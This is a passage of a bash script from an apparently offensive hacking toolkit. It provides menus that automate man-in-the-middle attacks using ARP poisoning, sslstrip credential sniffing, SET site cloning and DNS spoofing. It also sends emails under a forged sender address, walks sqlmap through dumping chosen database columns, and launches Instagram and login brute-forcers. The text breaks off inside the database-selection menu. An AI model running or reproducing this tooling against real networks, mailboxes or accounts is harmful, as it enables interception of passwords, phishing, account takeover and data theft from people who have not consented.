#!/bin/bash
# This file is sourced by `l`, not run directly. MITM and web-facing attack tooling: the MITM menu, mitmf+BeEF,
# email spoofing, sqlmap automation, website tools, and the
# browser-exploiting / router-bruteforce menus.

function mitm_menu
{
clear
TERMINALTITLE="MITM"
dash_calc
printf '\033]2;MITM\a'
echo -e """$YS"" 1""$CE"") Password sniff-sslstrip"
echo -e """$YS"" 2""$CE"") SET + mitm + dnsspoofing"
echo -e """$YS"" b""$CE"") Go back"
echo -e """$YS"" 0""$CE"") EXIT"
read MITMATT
clear
if [[ "$MITMATT" = "1" ]]
then
	while true
	do
	clear
	echo -e "------------------------------""$RS""MITM""$CE""-------------------------------"
	echo -e """$YS"" 1""$CE"") Enable ip_forward                 ""$YS""d1""$CE"") Disable ip_forward "
	echo -e """$YS"" 3""$CE"") Scan and select target IP         ""$YS""33""$CE"") I have scaned"
	echo -e """$YS"" 4""$CE"") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
	echo -e """$YS"" b""$CE"") Go back"
	echo -e """$YS"" 0""$CE"") EXIT"
	echo -e "Choose: "
	read -e MITMCH
	if [[ "$MITMCH" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "3" ]]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway(prefer ""$ETH"" gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(""$YS""Enter""$CE""=""$ETH""):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP:"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/mitm-helpers || exit
		open_terminal "60x12+0+999999" "./dns2proxy.sh"
		open_terminal "60x20+999999+999999" "./arpspoof-poison-gateway.sh"
		open_terminal "60x20+999999+0" "./arpspoof-poison-target.sh"
		sslstrip -l "$PORTTCP" -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "33" ]]
	then
		clear
		echo -e "Enter your gateway(prefer ""$ETH"" gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(""$YS""Enter""$CE""=""$ETH""):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi
		clear
		echo -e "Enter your target IP(""$YS""r""$CE""=rescan):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/mitm-helpers || exit
		open_terminal "60x25+0+999999" "./dns2proxy.sh"
		open_terminal "60x25+999999+0" "./arpspoof-poison-target.sh"
		open_terminal "60x25+999999+999999" "./arpspoof-poison-gateway.sh"
		sslstrip -l "$PORTTCP" -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "4" ]]
	then
		leafpad /root/sslstrip.log
	#~ elif [[ "$MITMCH" = "44" ]]
	#~ then
	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMCH" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMCH" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "2" ]]
then
	while true
	do
	clear
	echo -e "------------------------------""$RS""MITM""$CE""-------------------------------"
	echo -e """$YS"" 1""$CE"") Enable ip_forward                 ""$YS""d1""$CE"") Disable ip_forward"
	echo -e """$YS"" 2""$CE"") Scan and select target IP         ""$YS""22""$CE"") I have scaned"
	echo -e """$YS"" 3""$CE"") Start ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
	echo -e """$YS"" 4""$CE"") Start SEToolkit"
	echo -e """$YS"" 5""$CE"") Start DNSspoofing"
	echo -e """$YS"" b""$CE"") Go back"
	echo -e """$YS"" 0""$CE"") EXIT"
	echo -e "Choose: "
	read -e MITMSET
	clear
	if [[ "$MITMSET" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "2" ]]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP(""$YS""r""$CE""=rescan):"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
	elif [[ "$MITMSET" = "22" ]]
	then
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		clear
		echo -e "Enter your target IP:"
		read TARGIP
	elif [[ "$MITMSET" = "3" ]]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/mitm-helpers || exit
		open_terminal "60x15+999999+0" "./arpspoof-poison-target.sh"
		open_terminal "60x15+999999+999999" "./arpspoof-poison-gateway.sh"
	#~ elif [[ "$MITMSET" = "4" ]]
	#~ then
		#~ service apache2 start
	#~ elif [[ "$MITMSET" = "d4" ]]
	#~ then
		#~ service apache2 stop
	elif [[ "$MITMSET" = "4" ]]
	then
		echo -e "Clone a website to one of the following IP(s):"
		ip addr | grep '/24' | awk -F "inet " '{print $2}' | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		open_terminal "66x40+999999+0" "setoolkit"
	elif [[ "$MITMSET" = "5" ]]
	then
		echo -e "Making you a hosts.txt file"
		echo -e ""
		echo -e "Enter your IP address that you started the server:"
		echo -e "One of this/these:"
		ip addr | grep '/24' | awk -F "inet " '{print $2}' | cut -d '/' -f1
		read -e SERVIP
		echo -e "Enter the interface of that IP(e.g: wlan0):"
		read -e INTIP
		if [[ -f "${LPATH}/HOSTS/hosts.txt" ]]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "Add another one as well?""$YNYES"""
		read -e ANOTHERHOST
		if [[ "$ANOTHERHOST" = "n" ]]
		then
			break
		fi
		done
		clear
		echo -e "Starting dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e bash -c "dnsspoof -i \"$INTIP\" -f \"$LPATH\"/HOSTS/hosts.txt" & disown
	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMSET" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMSET" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
then
	BACKL="1"
	return
elif [[ "$MITMATT" = "00" ]]
then			
	clear
	exec bash "$0"
elif [[ "$MITMATT" = "0" ]]
then
	clear
	exit
fi
}

function website_tools
{
	while true 
	do
		clear
		TERMINALTITLE="WEBSITE TOOLS"
		dash_calc
		printf '\033]2;WEBSITE TOOLS\a'
		if [[ -f /usr/bin/sqlmap ]]
		then
			echo -e """$YS"" 1""$CE"") SQLmap                Automatic SQL injection and database takeover tool"
		else
			echo -e """$RS"" 1""$CE"") ""$RS""SQLmap""$CE""                Automatic SQL injection and database takeover tool"
		fi
		if [[ -d /root/leviathan ]]
		then
			echo -e """$YS"" 2""$CE"") Leviathan             Wide range mass audit toolkit"
		else
			echo -e """$RS"" 2""$CE"") ""$RS""Leviathan""$CE""             Wide range mass audit toolkit"
		fi
		if [[ -d /root/NoSQLMap ]]
		then
			echo -e """$YS"" 3""$CE"") NoSQLMap              Automated NoSQL exploitation tool"
		else
			echo -e """$RS"" 3""$CE"") ""$RS""NoSQLMap""$CE""              Automated NoSQL exploitation tool"
		fi
		if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
		then
			echo -e """$YS"" 4""$CE"") Yuki Chan             Automated Pentest Tool"
		else
			echo -e """$RS"" 4""$CE"") ""$RS""Yuki Chan""$CE""             Automated Pentest Tool"
		fi
		if [[ -d /root/Blazy ]]
		then
			echo -e """$YS"" 5""$CE"") Blazy                 Login bruteforcer/tests for CSRF, Cj, Cloudflare, WAF"
		else
			echo -e """$RS"" 5""$CE"") ""$RS""Blazy""$CE""                 Login bruteforcer/tests for CSRF, Clickjacking, Cloudflare and WAF"
		fi
		if [[ -d /root/Striker ]]
		then
			echo -e """$YS"" 6""$CE"") Striker               An offensive information and vulnerability scanner"
		else
			echo -e """$RS"" 6""$CE"") ""$RS""Striker""$CE""               An offensive information and vulnerability scanner"
		fi
		if [[ -d /root/hyprPulse ]]
		then
			echo -e """$YS"" 7""$CE"") HyprPulse             Brute force multiple accounts at once"
		else
			echo -e """$RS"" 7""$CE"") ""$RS""HyprPulse""$CE""             Brute force multiple accounts at once"
		fi
		if [[ -d /root/hyprPulse ]]
		then
			echo -e """$YS"" 8""$CE"") InstaBurst            A faster way to brute force Instagram"
		else
			echo -e """$RS"" 8""$CE"") ""$RS""InstaBurst""$CE""             A faster way to brute force Instagram"
		fi
		if [[ -f /usr/local/bin/instagram-py ]]
		then
			echo -e """$YS"" 9""$CE"") Instagram-py          Brute force Instagram without password limiting"
		else
			echo -e """$RS"" 9""$CE"") ""$RS""Instagram-py""$CE""          Brute force Instagram without password limiting"
		fi
		if [[ -d /root/datasploit ]]
		then
			echo -e """$YS""10""$CE"") Datasploit            Recon on Companies, People, Phone, Bitcoin..."
		else
			echo -e """$RS""10""$CE"") ""$RS""Datasploit""$CE""            Recon on Companies, People, Phone, Bitcoin..."
		fi
		if [[ -d /root/SiteBroker ]]
		then
			echo -e """$YS""11""$CE"") SiteBroker            Utility to penetrate and test websites"
		else
			echo -e """$RS""11""$CE"") ""$RS""SiteBroker""$CE""            Utility to penetrate and test websites"
		fi
		echo -e """$YS"" b""$CE"") Go back"
		echo -e """$YS""00""$CE"") Main menu"
		echo -e "Choose: "
		read WEB
		clear
		if [[ "$WEB" = 1 ]]
		then
			if [[ -f /usr/bin/sqlmap ]]
			then
				sqlmap_menu
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sqlmap
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 2 ]]
		then
			if [[ -d /root/leviathan ]]
			then
				cd /root/leviathan || exit
				python leviathan.py
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_leviathan
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 3 ]]
		then
			if [[ -d /root/NoSQLMap ]]
			then
				cd /root/NoSQLMap || exit
				python nosqlmap.py
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_nosqlmap
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 4 ]]
		then
			if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
			then
				cd /root/Yuki-Chan-The-Auto-Pentest || exit
				./yuki.sh
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_yuki
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 5 ]]
		then
			if [[ -d /root/Blazy ]]
			then
				cd /root/Blazy || exit
				python blazy.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_blazy
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 6 ]]
		then
			if [[ -d /root/Striker ]]
			then
				cd /root/Striker || exit
				python striker.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_striker
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 7 ]]
		then
			if [[ -d /root/hyprPulse ]]
			then
				cd /root/hyprPulse || exit
				python pulsar.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_hyprpulse
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 8 ]]
		then
			if [[ -d /root/InstaBurst ]]
			then
				cd /root/InstaBurst || exit
				python instagram.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_instaburst
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 9 ]]
		then
			if [[ -f /usr/local/bin/instagram-py ]]
			then
				while true
				do
					clear
					TERMINALTITLE="Instagram-py"
					dash_calc
					printf '\033]2;Instagram-py\a'
					echo -e " ""$YS""1""$CE"") New attack"
					echo -e " ""$YS""2""$CE"") Continue previous attack"
					echo -e " ""$YS""3""$CE"") View cracked passwords"
					echo -e " ""$YS""4""$CE"") Create configuration"
					echo -e " ""$YS""b""$CE"") Go back"
					read C
					clear
					if [[ "$C" == 1 ]]
					then
						echo -e """$YS""Username: ""$CE"""
						read USRNM
						echo -e """$YS""Wordlist path: ""$CE"""
						read WRDLST
						if [[ ! -f "$WRDLST" ]]
						then
							echo -e """$RS""File not found""$CE"""
							sleep 2
							continue
						fi
						instagram-py -vvv -u "$USRNM" -pl "$WRDLST"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 2 ]]
					then
						echo -e """$YS""Username: ""$CE"""
						read USRNM
						echo -e """$YS""Wordlist path: ""$CE"""
						read WRDLST
						if [[ ! -f "$WRDLST" ]]
						then
							echo -e """$RS""File not found""$CE"""
							sleep 2
							continue
						fi
						instagram-py -vvv -c -u "$USRNM" -pl "$WRDLST"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 3 ]]
					then
						echo -e """$YS""Username: ""$CE"""
						read USRNM
						instagram-py -i "$USRNM"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 4 ]]
					then
						instagram-py -cc
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == "b" || "$C" == "back" ]]
					then
						clear
						break
					elif [[ "$C" == 0 ]]
					then
						clear
						exit
					elif [[ "$C" == 00 ]]
					then
						exec bash "$0"
					fi
				done
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_instagram-py
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 10 ]]
		then
			if [[ -d /root/datasploit ]]
			then
				echo -e """$YS""Domain: ""$CE"""
				read DMN
				cd /root/datasploit || exit
				python datasploit.py -i "$DMN"
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_datasploit
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 11 ]]
		then
			if [[ -d /root/SiteBroker ]]
			then
				cd /root/SiteBroker || exit
				python SiteBroker.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sitebroker
				else
					continue
				fi
			fi

		elif [[ "$WEB" = "" ]]
		then
			continue
		elif [[ "$WEB" = 0 ]]
		then
			exit
		elif [[ "$WEB" = 00 ]]
		then
			exec bash "$0"
		elif [[ "$WEB" = "back" || "$WEB" = "b" ]]
		then
			break
		fi
		#~ echo -e "$PAKTGB"
		#~ $READAK
	done
}

function spoof_email
{
while true
do
	sm=0
	clear
	if [[ ! -d /bin/lscript/smtp ]]
	then
		mkdir /bin/lscript/smtp
	fi
	echo -e """$RS""YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL.""$CE"""
	echo -e """$RS""THEN GO TO https://app.smtp2go.com/settings/users AND MAKE A USERNAME AND PASS.""$CE"""
	echo -e """$RS""      ########ALWAYS HAVE PERMISSION OF THE EMAILS YOU SPOOF########""$CE"""
	echo -e """$RS""      ########DONT SEND VIRUSES , PHISHING OR ILLEGAL THINGS########""$CE"""
	if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
	then
		echo -e """$YS"" 1""$CE"") Set your SMTP username and pass     ""$RS""NOT SET""$CE"""
	else
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		echo -e """$YS"" 1""$CE"") Set your SMTP username and pass     Current: ""$YS""""$smtpemail""""$CE"""
	fi
	echo -e """$YS"" 2""$CE"") Send a spoofed email"
	echo -e """$YS"" 3""$CE"") Clear your SMTP username and pass from lscript"
	echo -e """$YS"" 4""$CE"") Fix email failed"
	echo -e """$YS"" b""$CE"") Go back"
	echo -e """$YS"" 0""$CE"") EXIT"
	read SMTP
	if [[ "$SMTP" = "1" ]]
	then
		clear
		echo -e "Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPEMAIL
		echo -e "Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPPASS
		clear
		echo "$SMTPEMAIL" > /bin/lscript/smtp/smtpemail.txt
		echo "$SMTPPASS" > /bin/lscript/smtp/smtppass.txt 
		echo -e "Credentials saved on /bin/lscript/smtp"
		sleep 3
	elif [[ "$SMTP" = "4" ]]
	then
		clear	
		echo -e "If you email fails, the reason is because on option 1 you didnt set the correct username and password. Find those at https://app.smtp2go.com/settings/users."
		sleep 2
		echo -e "$PAKTGB"
		read -e -n 1 -r
	elif [[ "$SMTP" = "3" ]]
	then
		if [[ -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			rm /bin/lscript/smtp/smtpemail.txt
			echo -e "Username removed"
		else
			echo -e "Not username found"
		fi
		if [[ -f /bin/lscript/smtp/smtppass.txt ]]
		then
			rm /bin/lscript/smtp/smtppass.txt
			echo -e "Password removed"
		else
			echo -e "Not password found"
		fi
		sleep 2
		continue
	elif [[ "$SMTP" = "0" ]]
	then
		clear
		exit
	elif [[ "$SMTP" = "back" || "$SMTP" = "b" ]]
	then
		clear
		break
	elif [[ "$SMTP" = "2" ]]
	then
		while true
		do
		clear
		if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			echo -e "No smtp username found."
			sm=1
		fi
		if [[ ! -f /bin/lscript/smtp/smtppass.txt ]]
		then
			echo -e "No smtp pass found."
			sm=1
		fi
		if [[ "$sm" = 1 ]]
		then
			break
		fi
		read smtppass < /bin/lscript/smtp/smtppass.txt
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		clear
		echo -e "Your username is ""$RS""""$smtpemail""""$CE"""
		echo -e ""
		echo -e "Enter the target's email: "
		read TARGETSEMAIL
		echo -e "Enter the email that you want the target to see: "
		read SPOOFEDEMAIL
		echo -e "Enter the subject of the message: "
		read SUBJECTEMAIL
		echo -e "Enter the message: "
		read MESSAGEEMAIL
		echo -e "Enter the smtp server (""$YS""Enter""$CE""=mail.smtp2go.com): "
		read SMTPSERVER
		if [[ "$SMTPSERVER" = "" ]]
		then
			SMTPSERVER="mail.smtp2go.com"
		fi
		echo -e "Enter the smtp port (""$YS""Enter""$CE""=2525): "
		read SMTPPORT
		if [[ "$SMTPPORT" = "" ]]
		then
			SMTPPORT="2525"
		fi
		echo -e "Press ""$YS""enter""$CE"" to send the message to ""$TARGETSEMAIL"""
		read 
		clear
		sendemail -f "$SPOOFEDEMAIL" -t "$TARGETSEMAIL" -u "$SUBJECTEMAIL" -m "$MESSAGEEMAIL" -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
		echo -e "$PAKTGB"
		read -e -n 1 -r
		break
		done
	fi
done
}

function sqlmap_menu
{
file2="/root/lscript/sqltemp2"
file3="/root/lscript/sqltemp3"
file4="/root/lscript/sqltemp34"
while true
do
	clear
	TERMINALTITLE="SQLMAP"
	dash_calc
	printf '\033]2;SQLMAP\a'
	if [[ "$URL" = "" ]]
	then
		URL="${RS}None${CE}"
		urls=0
	fi
	if [[ "$FDBS" = "" ]]
	then
		FDBS="${RS}None${CE}"
		fdbss=0
	fi
	if [[ "$SD" = "" ]]
	then
		SD="${RS}None${CE}"
		sds=0
	fi
	if [[ "$TB" = "" ]]
	then
		TB="${RS}None${CE}"
		tbs=0
	fi
	if [[ "$ST" = "" ]]
	then
		ST="${RS}None${CE}"
		sts=0
	fi
	if [[ "$CL" = "" ]]
	then
		CL="${RS}None${CE}"
		cls=0
	fi
	if [[ "$SC" = "" ]]
	then
		SC="${RS}None${CE}"
		scs=0
	fi
	echo -e """$YS"" 1""$CE"") URL                         Current:""$YS""$URL""$CE"""
	if [[ "$urls" = 0 ]]
	then
		echo -e """$RS"" 2""$CE"") Fetch databases             Current:$FDBS"
	else
		echo -e """$YS"" 2""$CE"") Fetch databases             Current:$FDBS"
	fi
	if [[ "$fdbss" = 0 ]]
	then
		echo -e """$RS"" 3""$CE"") Select database             Current:""$YS""$SD""$CE"""
	else
		echo -e """$YS"" 3""$CE"") Select database             Current:""$YS""$SD""$CE"""
	fi
	if [[ "$sds" = 0 ]]
	then
		echo -e """$RS"" 4""$CE"") Fetch tables                Current:""$YS""$TB""$CE"""
	else
		echo -e """$YS"" 4""$CE"") Fetch tables                Current:""$YS""$TB""$CE"""
	fi
	if [[ "$tbs" = 0 ]]
	then
		echo -e """$RS"" 5""$CE"") Select table                Current:""$YS""$ST""$CE"""
	else
		echo -e """$YS"" 5""$CE"") Select table                Current:""$YS""$ST""$CE"""
	fi
	if [[ "$sts" = 0 ]]
	then
		echo -e """$RS"" 6""$CE"") Fetch columns               Current:""$YS""$CL""$CE"""
	else
		echo -e """$YS"" 6""$CE"") Fetch columns               Current:""$YS""$CL""$CE"""
	fi
	if [[ "$cls" = 0 ]]
	then
		echo -e """$RS"" 7""$CE"") Select columns              Current:""$YS""$SC""$CE"""
	else
		echo -e """$YS"" 7""$CE"") Select columns              Current:""$YS""$SC""$CE"""
	fi
	if [[ "$scs" = 0 ]]
	then
		echo -e """$RS"" s""$CE"") Start"
	else
		echo -e """$YS"" s""$CE"") Start"
	fi
	echo -e """$YS"" b""$CE"") Go back"
	echo -e "Choose: "
	read SQ
	clear
	if [[ "$SQ" = 1 ]]
	then
		echo -n "URL: "
		read URLL
		if [[ "$URLL" != "" || "$URLL" = "b" ]]
		then
			URL="$URLL"
			urls=1
				##Clearing nexts
				FDBS=""
				fdbss=0
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = "s" ]]
	then
		if [[ "$scs" = 0 ]]
		then
			echo -e """$RS""No columns selected""$CE"""
			sleep 2
			break
		fi
		#~ export URL
		#~ export SD
		#~ export ST
		#~ export SC
		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
		echo -e ""
		echo -e "${YS}A log file has been created on ${file4}. Copy it before it gets overwritten${CE}"
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$SQ" = "b" ]]
	then
		break
	elif [[ "$SQ" = 00 ]]
	then
		exec bash "$0"
	elif [[ "$SQ" = 7 ]]
	then
		if [[ "$cls" = 0 ]]
		then
			echo -e """$RS""Columns not fetched""$CE"""
			sleep 2
			break
		fi
		n10=1
		CCO1="$CO1"
		while [[ "$n10" -le "$NCO" ]]
		do
			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
			CCO1=$((CCO1+1))
			n10=$((n10+1))
		done
		while true
		do
			clear
			echo -e """$BS""Columns: ""$CE"""
			v=1
			while [[ "$v" -le "$NCO" ]]
			do
				if [[ "${selc[$v]}" = 1 ]]
				then
					SSC="$YS"
				else
					SSC="$WHS"
				fi
				if [[ "$v" -le 9 ]]
				then
					echo -e """$YS""  $v""$CE"") ""$SSC""${cl[$v]}""$CE"""
				elif [[ "$v" -le 99 ]]
				then
					echo -e """$YS"" $v""$CE"") ""$SSC""${cl[$v]}""$CE"""
				else
					echo -e """$YS""$v""$CE"") ""$SSC""${cl[$v]}""$CE"""
				fi
				v=$((v+1))
			done
			echo -e """$YS"" d""$CE"") Deselect all"
			echo -e """$YS"" s""$CE"") Save selection"
			echo -e """$YS"" b""$CE"") Go back"
			echo -e "Choose: "
			read COCH
			clear
			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
			then
				break
			elif [[ "$COCH" = "s" ]] 
			then
				v2=1
				SC=""
				while [[ "$v2" -le "$NCO" ]]
				do
					if [[ "${selc[$v2]}" = 1 ]]
					then
						if [[ "$SC" = "" ]]
						then
							SC="${cl[$v2]}"
						else
							SC="${SC},${cl[$v2]}"
						fi
					fi
					v2=$((v2+1))
				done
				if [[ "$SC" = "" ]]
				then
					echo -e """$RS""Nothing selected""$CE"""
					sleep 2
					continue
				fi
				break
			elif [[ "$COCH" = "d" ]] 
			then
				v1=1
				while [[ "$v1" -le "$NCO" ]]
				do
					selc[$v1]=""
					v1=$((v1+1))
				done
			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
			then
				echo -e """$RS""Wrong choice""$CE"""
				sleep 2
				continue
			else
				if [[ "${selc[$COCH]}" != 1 ]]
				then
					selc[$COCH]=1
				else
					selc[$COCH]=""
				fi
			fi
		done
	elif [[ "$SQ" = 6 ]]
	then
		while true
		do
			if [[ "$sts" = 0 ]]
			then
				echo -e """$RS""Table not selected""$CE"""
				sleep 2
				break
			fi
			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
			##finding columns
			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
			CO1=$(echo "$CO" | cut -d ' ' -f2)
			CO1=$((CO1+1))
			CO2=$(echo "$CO" | cut -d ' ' -f3)
			CO2=$((CO2-1))
			NCO=$((CO2-CO1))
			if [[ "$NCO" -le 0 ]]
			then
				echo -e """$RS""Error 24. No columns found automatically""$CE"""
				sleep 2
				cls=0
				continue
			else
				if [[ "$NCO" = 1 ]]
				then
					echo -e """$YS""1 column found!""$CE"""
					sleep 2
				else
					echo -e "${YS}${NCO} columns found!${CE}"
					sleep 2
				fi
				CL="Done"
				cls=1
				break
			fi
		done
	elif [[ "$SQ" = 5 ]]
	then
		while true
		do
			if [[ "$tbs" = 0 ]]
			then
				echo -e """$RS""Tables not fetched""$CE"""
				sleep 2
				break
			fi
			echo -e """$BS""Tables: ""$CE"""
			n9=1
			CC1="$C1"
			while [[ "$n9" -le "$NTB" ]]
			do
				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
				if [[ "$n9" -le 9 ]]
				then
					echo -e """$YS""  $n9""$CE"") ${tb[$n9]}"
				elif [[ "$n9" -le 99 ]]
				then
					echo -e """$YS"" $n9""$CE"") ${tb[$n9]}"
				else
					echo -e """$YS""$n9""$CE"") ${tb[$n9]}"
				fi
				CC1=$((CC1+1))
				n9=$((n9+1))
			done
			echo -e """$YS"" b""$CE"") Go back"
			echo -e "Choose: "
			read TCH
			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
			then
				break
			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
			then
				echo -e """$RS""Wrong choice""$CE"""
				sleep 2
				continue
			else
				ST="${tb[$TCH]}"
				sts=1
				##Clearing nexts
				cls=0
				CL=""
				scs=0
				SC=""
				break
			fi
		done
	elif [[ "$SQ" = 4 ]]
	then
		if [[ "$sds" = 0 ]]
		then
			echo -e """$RS""Databases not selected""$CE"""
			sleep 2
			continue
		fi
		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
		##finding tables
		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
		C1=$(echo "$C" | cut -d ' ' -f1)
		C1=$((C1+1))
		C2=$(echo "$C" | cut -d ' ' -f2)
		C2=$((C2-1))
		NTB=$((C2-C1))
		if [[ "$NTB" -le 0 ]]
		then
			echo -e """$RS""Error 23. No tables found automatically""$CE"""
			sleep 2
			tbs=0
			continue
		else
			if [[ "$NTB" = 1 ]]
			then
				echo -e """$YS""1 table found!""$CE"""
				sleep 2
			else
				echo -e "${YS}${NTB} tables found!${CE}"
				sleep 2
			fi
			TB="Done"
			tbs=1
				##Clearing nexts
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = 3 ]]
	then
		while true
		do
			if [[ "$fdbss" = 0 ]]
			then
				echo -e """$RS""Databases not fetched""$CE"""
				sleep 2
				continue
			fi
			echo -e """$BS""Databases: ""$CE"""
			n8=1
			while [[ "$n8" -le "$NDB" ]]
			do
				if [[ "$n8" -le 9 ]]
				then
					echo -e "${YS}  ${n8}${CE}) ${db[$n8]}"
				elif [[ "$n8" -le 99 ]]
				then
					echo -e "${YS} ${n8}${CE}) ${db[$n8]}"
				else
					echo -e "${YS}${n8}${CE}) ${db[$n8]}"
				fi
				n8=$((n8+1))
			done
			echo -e """$YS"" b""$CE"") Go back"
			echo -e "Choose: "
